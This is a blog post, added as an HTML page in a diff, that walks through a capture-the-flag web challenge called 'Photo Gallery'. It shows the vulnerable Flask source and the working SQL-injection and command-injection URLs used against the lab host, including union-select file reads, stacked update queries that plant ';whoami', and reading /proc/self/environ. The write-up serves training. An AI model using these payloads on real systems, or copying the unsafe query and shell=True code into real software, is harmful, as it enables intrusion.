@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en" prefix="og: https://ogp.me/ns#">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible"
+      content="IE=edge">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0" />
+<meta name="description"
+      content="Adventures of Functional Mediocrity" />
+<meta name="keywords"
+      content="zola, theme, ink, hugo-ink" /> 
+
+<title>John Tuyen | Photo Gallery</title>
+<meta
+  property="og:title"
+  content="John Tuyen | Photo Gallery"
+/>
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://johntuyen.com/posts/h1-photogallery/" />
+<meta property="og:description" content="Adventures of Functional Mediocrity" />
+<meta property="og:image" content="" />
+<meta property="og:image:url" content="" />
+<meta property="og:image:secure_url" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Photo Gallery" />
+<meta name="twitter:description" content="Adventures of Functional Mediocrity" />
+<meta property="twitter:image" content="" />
+
+<link rel="alternate"
+          type="application/rss+xml"
+          title="John Tuyen"
+          href="https://johntuyen.com/atom.xml">
+    <link rel="preconnect"
+          href="https://fonts.googleapis.com">
+    <link rel="preconnect"
+          href="https://fonts.gstatic.com"
+          crossorigin>
+    <!-- <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">  -->
+    <link href="https://fonts.googleapis.com/css2?family=Andada+Pro&display=swap&family=Playfair+Display"
+          rel="stylesheet">
+    <link rel="stylesheet"
+          href="https://johntuyen.com/base.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.28.0/feather.min.js"
+            integrity="sha512-7x3zila4t2qNycrtZ31HO0NnJr8kg2VI67YLoRSyi9hGhRN66FHYWr7Axa9Y1J9tGYHVBPqIjSE1ogHrJTz51g=="
+            crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <header>
+        <a class="site-name"
+           href="/">
+            <h1>John Tuyen</h1>
+        </a>
+        <div class="site-description">
+            <p>Adventures of Functional Mediocrity</p>
+        </div>
+        <nav>
+            <div class="links"> 
+            <a 
+                href="https://johntuyen.com/ ">About</a> 
+            <a 
+                href="https://johntuyen.com/posts/ ">Posts</a> 
+            <a 
+                href="https://johntuyen.com/gallery/ ">Gallery</a> 
+            <a 
+                href="https://johntuyen.com/tags/ ">Tags</a> 
+            <a 
+                href="https://johntuyen.com/search/ ">Search</a> 
+            </div>
+        </nav>
+    </header>
+    <article>
+    
+
+<section class="post">
+  <div class="post-header">
+    <div class="meta">
+      <div class="date">
+        <span class="day">30</span>
+        <span class="rest">Dec 20</span>
+      </div>
+    </div>
+
+    <div class="matter">
+      <h1 class="title">Photo Gallery </h1>
+    </div>
+  </div>
+    
+  <article><h3 id="flag0">Flag0</h3>
+<ol>
+<li>
+<p>&quot;Magical Image Gallery&quot;</p>
+<p><img src="https://johntuyen.com/posts/h1-photogallery/h1-photogallery-1.png" alt="h1-photogallery-1.png" /></p>
+<p>The images are fetched by using <code>id</code> parameters as such:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://34.74.105.127/9c4252a0af/fetch?id=1
+</span></code></pre>
+<p>When sending a GET request directly, the server doesn't render the URL as an image but as raw format. From past CTF experiences, this is usually a case of extracting a system file to obtain the flag.</p>
+<p>After roaming around the web application and performing basic enumeration tests, there wasn't other obvious possible footholds. Therefore my assumption is a SQL injection attack is most likely a possibility.</p>
+</li>
+<li>
+<p>Revealing Flag0 hints the web application is running <a href="https://github.com/tiangolo/uwsgi-nginx-flask-docker">uwsgi-nginx-flask-docker</a> image. After reviewing the repository, I can only assume that I'm suppose to read a file using SQL injection now that we know what framework is being used.</p>
+<p>With every docker image, there is always a <code>Dockerfile</code> that is included. After trial and error, a <code>union select</code> method was used to retrieve the <code>Dockerfile</code>.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://34.74.105.127/9c4252a0af/fetch?id=4%20union%20select%20%27Dockerfile%27
+</span></code></pre>
+<p>Output:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>FROM tiangolo/uwsgi-nginx-flask:python2.7 WORKDIR /app RUN apt-get update RUN DEBIAN_FRONTEND=noninteractive apt-get install -y mysql-client mysql-server default-libmysqlclient-dev build-essential ADD requirements.txt /app/ RUN pip install --trusted-host pypi.python.org -r requirements.txt ADD . /app
+</span></code></pre>
+<p>The output looks similar to the <code>Dockerfile</code> included in the repository with the exception two things:</p>
+<ol>
+<li>Installation of dependencies using <code>apt</code> and <code>pip</code>.</li>
+<li>Working directory is located in <code>/app</code></li>
+</ol>
+<p>Going through the enumeration phase again, I checked out what is inside <code>requirements.txt</code>.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>Flask mysqlclient pycrypto
+</span></code></pre>
+<p>Nothing interesting is found. Looking back into the Github repository, there was an <code>/app</code> directory that contains <code>main.py</code>, <code>prestart.sh</code>, and <code>uwsgi.ini</code>. After probing the three files, the <code>main.py</code> contains Flag0.</p>
+<p><img src="https://johntuyen.com/posts/h1-photogallery/h1-photogallery-2.png" alt="h1-photogallery-1.png" /> </p>
+</li>
+</ol>
+<h3 id="flag1">Flag1</h3>
+<ol>
+<li>
+<p>Now that we can see the source code, a review is performed.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>flask </span><span style="color:#b48ead;">import </span><span>Flask, abort, redirect, request, Response
+</span><span style="color:#b48ead;">import </span><span>base64, json, MySQLdb, os, re, subprocess
+</span><span>
+</span><span>app = </span><span style="color:#bf616a;">Flask</span><span>(__name__)
+</span><span>
+</span><span>home = &#39;&#39;&#39;
+</span><span style="color:#a3be8c;">&lt;!doctype html&gt;
+</span><span style="color:#a3be8c;">&lt;html&gt;
+</span><span style="color:#a3be8c;">	&lt;head&gt;
+</span><span style="color:#a3be8c;">		&lt;title&gt;Magical Image Gallery&lt;/title&gt;
+</span><span style="color:#a3be8c;">	&lt;/head&gt;
+</span><span style="color:#a3be8c;">	&lt;body&gt;
+</span><span style="color:#a3be8c;">		&lt;h1&gt;Magical Image Gallery&lt;/h1&gt;
+</span><span style="color:#a3be8c;">$ALBUMS$
+</span><span style="color:#a3be8c;">	&lt;/body&gt;
+</span><span style="color:#a3be8c;">&lt;/html&gt;
+</span><span>&#39;&#39;&#39;
+</span><span>
+</span><span>viewAlbum = &#39;&#39;&#39;
+</span><span style="color:#a3be8c;">&lt;!doctype html&gt;
+</span><span style="color:#a3be8c;">&lt;html&gt;
+</span><span style="color:#a3be8c;">	&lt;head&gt;
+</span><span style="color:#a3be8c;">		&lt;title&gt;$TITLE$ -- Magical Image Gallery&lt;/title&gt;
+</span><span style="color:#a3be8c;">	&lt;/head&gt;
+</span><span style="color:#a3be8c;">	&lt;body&gt;
+</span><span style="color:#a3be8c;">		&lt;h1&gt;$TITLE$&lt;/h1&gt;
+</span><span style="color:#a3be8c;">$GALLERY$
+</span><span style="color:#a3be8c;">	&lt;/body&gt;
+</span><span style="color:#a3be8c;">&lt;/html&gt;
+</span><span>&#39;&#39;&#39;
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">getDb</span><span>():
+</span><span>	</span><span style="color:#b48ead;">return </span><span>MySQLdb.</span><span style="color:#bf616a;">connect</span><span>(</span><span style="color:#bf616a;">host</span><span>=&quot;</span><span style="color:#a3be8c;">localhost</span><span>&quot;, </span><span style="color:#bf616a;">user</span><span>=&quot;</span><span style="color:#a3be8c;">root</span><span>&quot;, </span><span style="color:#bf616a;">password</span><span>=&quot;&quot;, </span><span style="color:#bf616a;">db</span><span>=&quot;</span><span style="color:#a3be8c;">level5</span><span>&quot;)
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">sanitize</span><span>(</span><span style="color:#bf616a;">data</span><span>):
+</span><span>	</span><span style="color:#b48ead;">return </span><span>data.</span><span style="color:#bf616a;">replace</span><span>(&#39;</span><span style="color:#a3be8c;">&amp;</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">&amp;amp;</span><span>&#39;).</span><span style="color:#bf616a;">replace</span><span>(&#39;</span><span style="color:#a3be8c;">&lt;</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">&amp;lt;</span><span>&#39;).</span><span style="color:#bf616a;">replace</span><span>(&#39;</span><span style="color:#a3be8c;">&gt;</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">&amp;gt;</span><span>&#39;).</span><span style="color:#bf616a;">replace</span><span>(&#39;</span><span style="color:#a3be8c;">&quot;</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">&amp;quot;</span><span>&#39;)
+</span><span>
+</span><span>@app.</span><span style="color:#bf616a;">route</span><span>(&#39;</span><span style="color:#a3be8c;">/</span><span>&#39;)
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">index</span><span>():
+</span><span>	cur = </span><span style="color:#bf616a;">getDb</span><span>().</span><span style="color:#bf616a;">cursor</span><span>()
+</span><span>	cur.</span><span style="color:#bf616a;">execute</span><span>(&#39;</span><span style="color:#b48ead;">SELECT</span><span style="color:#a3be8c;"> id, title </span><span style="color:#b48ead;">FROM</span><span style="color:#a3be8c;"> albums</span><span>&#39;)
+</span><span>	albums = </span><span style="color:#bf616a;">list</span><span>(cur.</span><span style="color:#bf616a;">fetchall</span><span>())
+</span><span>
+</span><span>	rep = &#39;&#39;
+</span><span>	</span><span style="color:#b48ead;">for </span><span style="color:#96b5b4;">id</span><span>, title </span><span style="color:#b48ead;">in </span><span>albums:
+</span><span>		rep += &#39;</span><span style="color:#a3be8c;">&lt;h2&gt;</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">&lt;/h2&gt;</span><span style="color:#96b5b4;">\n</span><span>&#39; % </span><span style="color:#bf616a;">sanitize</span><span>(title)
+</span><span>		rep += &#39;</span><span style="color:#a3be8c;">&lt;div&gt;</span><span>&#39;
+</span><span>		cur.</span><span style="color:#bf616a;">execute</span><span>(&#39;</span><span style="color:#b48ead;">SELECT</span><span style="color:#a3be8c;"> id, title, filename </span><span style="color:#b48ead;">FROM</span><span style="color:#a3be8c;"> photos </span><span style="color:#b48ead;">WHERE</span><span style="color:#a3be8c;"> parent</span><span>=</span><span style="color:#d08770;">%s </span><span style="color:#b48ead;">LIMIT </span><span style="color:#d08770;">3</span><span>&#39;, (</span><span style="color:#96b5b4;">id</span><span>, ))
+</span><span>		fns = []
+</span><span>		</span><span style="color:#b48ead;">for </span><span>pid, ptitle, pfn </span><span style="color:#b48ead;">in </span><span>cur.</span><span style="color:#bf616a;">fetchall</span><span>():
+</span><span>			rep += &#39;</span><span style="color:#a3be8c;">&lt;div&gt;&lt;img src=&quot;fetch?id=</span><span style="color:#d08770;">%i</span><span style="color:#a3be8c;">&quot; width=&quot;266&quot; height=&quot;150&quot;&gt;&lt;br&gt;</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">&lt;/div&gt;</span><span>&#39; % (pid, </span><span style="color:#bf616a;">sanitize</span><span>(ptitle))
+</span><span>			fns.</span><span style="color:#bf616a;">append</span><span>(pfn)
+</span><span>		rep += &#39;</span><span style="color:#a3be8c;">&lt;i&gt;Space used: </span><span>&#39; + subprocess.</span><span style="color:#bf616a;">check_output</span><span>(&#39;</span><span style="color:#a3be8c;">du -ch </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;"> || exit 0</span><span>&#39; % &#39; &#39;.</span><span style="color:#bf616a;">join</span><span>(&#39;</span><span style="color:#a3be8c;">files/</span><span>&#39; + fn </span><span style="color:#b48ead;">for </span><span>fn </span><span style="color:#b48ead;">in </span><span>fns), </span><span style="color:#bf616a;">shell</span><span>=</span><span style="color:#d08770;">True</span><span>, </span><span style="color:#bf616a;">stderr</span><span>=subprocess.</span><span style="color:#bf616a;">STDOUT</span><span>).</span><span style="color:#bf616a;">strip</span><span>().</span><span style="color:#bf616a;">rsplit</span><span>(&#39;</span><span style="color:#96b5b4;">\n</span><span>&#39;, </span><span style="color:#d08770;">1</span><span>)[-</span><span style="color:#d08770;">1</span><span>] + &#39;</span><span style="color:#a3be8c;">&lt;/i&gt;</span><span>&#39;
+</span><span>		rep += &#39;</span><span style="color:#a3be8c;">&lt;/div&gt;</span><span style="color:#96b5b4;">\n</span><span>&#39;
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">return </span><span>home.</span><span style="color:#bf616a;">replace</span><span>(&#39;</span><span style="color:#a3be8c;">$ALBUMS$</span><span>&#39;, rep)
+</span><span>
+</span><span>@app.</span><span style="color:#bf616a;">route</span><span>(&#39;</span><span style="color:#a3be8c;">/fetch</span><span>&#39;)
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">fetch</span><span>():
+</span><span>	cur = </span><span style="color:#bf616a;">getDb</span><span>().</span><span style="color:#bf616a;">cursor</span><span>()
+</span><span>	</span><span style="color:#b48ead;">if </span><span>cur.</span><span style="color:#bf616a;">execute</span><span>(&#39;</span><span style="color:#b48ead;">SELECT</span><span style="color:#a3be8c;"> filename </span><span style="color:#b48ead;">FROM</span><span style="color:#a3be8c;"> photos </span><span style="color:#b48ead;">WHERE</span><span style="color:#a3be8c;"> id</span><span>=</span><span style="color:#d08770;">%s</span><span>&#39; % request.args[&#39;</span><span style="color:#a3be8c;">id</span><span>&#39;]) == </span><span style="color:#d08770;">0</span><span>:
+</span><span>		</span><span style="color:#bf616a;">abort</span><span>(</span><span style="color:#d08770;">404</span><span>)
+</span><span>
+</span><span>	</span><span style="color:#65737e;"># It&#39;s dangerous to go alone, take this:
+</span><span>	</span><span style="color:#65737e;"># ^FLAG^XXXXXX$FLAG$
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">file</span><span>(&#39;</span><span style="color:#a3be8c;">./</span><span style="color:#d08770;">%s</span><span>&#39; % cur.</span><span style="color:#bf616a;">fetchone</span><span>()[</span><span style="color:#d08770;">0</span><span>].</span><span style="color:#bf616a;">replace</span><span>(&#39;</span><span style="color:#a3be8c;">..</span><span>&#39;, &#39;&#39;), &#39;</span><span style="color:#a3be8c;">rb</span><span>&#39;).</span><span style="color:#bf616a;">read</span><span>()
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &quot;</span><span style="color:#a3be8c;">__main__</span><span>&quot;:
+</span><span>	app.</span><span style="color:#bf616a;">run</span><span>(</span><span style="color:#bf616a;">host</span><span>=&#39;</span><span style="color:#a3be8c;">0.0.0.0</span><span>&#39;, </span><span style="color:#bf616a;">port</span><span>=</span><span style="color:#d08770;">80</span><span>)
+</span></code></pre>
+</li>
+<li>
+<p>This part of the code stood out as dangerous:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>rep += &#39;</span><span style="color:#a3be8c;">&lt;i&gt;Space used: </span><span>&#39; + subprocess.</span><span style="color:#bf616a;">check_output</span><span>(&#39;</span><span style="color:#a3be8c;">du -ch </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;"> || exit 0</span><span>&#39; % &#39; &#39;.</span><span style="color:#bf616a;">join</span><span>(&#39;</span><span style="color:#a3be8c;">files/</span><span>&#39; + fn </span><span style="color:#b48ead;">for </span><span>fn </span><span style="color:#b48ead;">in </span><span>fns), </span><span style="color:#bf616a;">shell</span><span>=</span><span style="color:#d08770;">True</span><span>, </span><span style="color:#bf616a;">stderr</span><span>=subprocess.</span><span style="color:#bf616a;">STDOUT</span><span>).</span><span style="color:#bf616a;">strip</span><span>().</span><span style="color:#bf616a;">rsplit</span><span>(&#39;</span><span style="color:#96b5b4;">\n</span><span>&#39;, </span><span style="color:#d08770;">1</span><span>)[-</span><span style="color:#d08770;">1</span><span>] + &#39;</span><span style="color:#a3be8c;">&lt;/i&gt;</span><span>&#39;
+</span></code></pre>
+<p>The &quot;spaced used&quot; is displayed using <code>du -ch</code> with a supplied user input from <code>%s</code>. This bad coding practice is susceptible to OS command line injection. Even though a part of the code does have an input sanitization function in place, it doesn't sanitize for semi-colon which is commonly used for injection type attacks.</p>
+<p>To exploit the vulnerability, the <code>id</code> parameter needs to be escaped using a semi-colon to close the SQL statement and inject an <code>update</code> statement.</p>
+<pre data-lang="sql" style="background-color:#2b303b;color:#c0c5ce;" class="language-sql "><code class="language-sql" data-lang="sql"><span>http://</span><span style="color:#d08770;">34</span><span>.</span><span style="color:#d08770;">74</span><span>.</span><span style="color:#d08770;">105</span><span>.</span><span style="color:#d08770;">127</span><span>/9c4252a0af/fetch?id=</span><span style="color:#d08770;">1</span><span>; </span><span style="color:#b48ead;">update</span><span> photos </span><span style="color:#b48ead;">set</span><span> filename=&quot;</span><span style="color:#a3be8c;">whoami</span><span>&quot; </span><span style="color:#b48ead;">where</span><span> id=</span><span style="color:#d08770;">1</span><span>; </span><span style="color:#b48ead;">commit
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/h1-photogallery/h1-photogallery-3.png" alt="h1-photogallery-3.png" /> </p>
+<p>As you can see, the command did execute and parsed on the web page but for some reason the command is showing a try exception. After trial and error, the <code>du -ch %s</code> needs to be escaped as well using semi-colon for the OS command to execute.</p>
+<pre data-lang="sql" style="background-color:#2b303b;color:#c0c5ce;" class="language-sql "><code class="language-sql" data-lang="sql"><span>http://</span><span style="color:#d08770;">34</span><span>.</span><span style="color:#d08770;">74</span><span>.</span><span style="color:#d08770;">105</span><span>.</span><span style="color:#d08770;">127</span><span>/9c4252a0af/fetch?id=</span><span style="color:#d08770;">1</span><span>; </span><span style="color:#b48ead;">update</span><span> photos </span><span style="color:#b48ead;">set</span><span> filename=&quot;</span><span style="color:#a3be8c;">;whoami</span><span>&quot; </span><span style="color:#b48ead;">where</span><span> id=</span><span style="color:#d08770;">1</span><span>; </span><span style="color:#b48ead;">commit   
+</span></code></pre>
+<p>In the real world, this evidence is enough to submit a bug bounty report but because this is a CTF so we need to find the second flag. Additional hints reveal something about being aware of the environment. After digging around what this means, the final two flags can be found in <code>/proc/self/environ</code>.</p>
+</li>
+</ol>
+</article>
+
+  
+    
+  
+  <ul class="tags">
+    
+      <li><a href='https://johntuyen.com/tags/hackerone'>hackerone</a></li>
+    
+  </ul>
+  
+  
+    
+</section>
+</article>
+    <footer>
+        <div class="social">
+            <ul> 
+                 
+                <li>
+                    <a href="https://github.com/jtuyen"
+                       title="Github" rel="me"><i data-feather="github"></i></a>
+                </li>
+                 
+                 
+                <li>
+                    <a href="https://twitter.com/jtuyen"
+                       title="Twitter"
+                       rel="me"><i data-feather="twitter"></i></a>
+                </li>
+                
+                
+                
+                <li>
+                    <a href="https://johntuyen.com/atom.xml"
+                       title="John Tuyen"><i data-feather="rss"></i></a>
+                </li>
+            </ul>
+        </div>
+        <p> © John Tuyen 2024
+
+        
+        <br>Powered by <a target="_blank" href="https://getzola.org/">Zola</a>. Theme: <a target="_blank" href="https://github.com/jimmyff/zola-inky">Inky</a>.
+        </p>
+    </footer>
+    <script>
+        feather.replace();
+    </script> 
+    </body>
+</html>
